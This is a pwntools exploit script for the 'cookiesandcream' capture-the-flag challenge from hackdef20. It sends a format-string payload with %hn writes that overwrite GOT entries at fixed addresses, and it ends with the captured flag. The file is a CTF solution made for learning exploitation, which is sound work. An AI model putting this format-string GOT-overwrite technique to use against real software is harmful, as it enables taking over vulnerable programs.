#cookiesandcream hackdef20
#Ivan Medina
#undefined


from pwn import *

pay='%2052c%013$hn%32283c%014$hnA'
got=p32(0x0804a00e)
plt=p32(0x0804a00c)
payload=pay+got+plt
#context.log_level = 'debug'	
elf = ELF("./cookiesandcream")
#winner = 0x804861f

gs = '''

break vuln
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs,buffer_fill_size=0xffff)
    else:
        #return remote("220.249.52.133","56273")
        return process(elf.path,buffer_fill_size=0xffff)

def exec_fmt(s):
    p=start()
    print("%s: %s"%("payload: ",s))
    p.sendlineafter(">","")
    p.sendlineafter(">","")
    p.sendlineafter(">","")
    p.recvuntil(">")
    p.sendline(s)
    p.recv()
    p.sendline("AAAA")
    p.recvline()
    p.recvline()
    p.recvline()
    print(p.recvline())

exec_fmt(payload)

#hackdef{F0rm4t_Str1ng_3asY_BuT_N33d_C00kies}
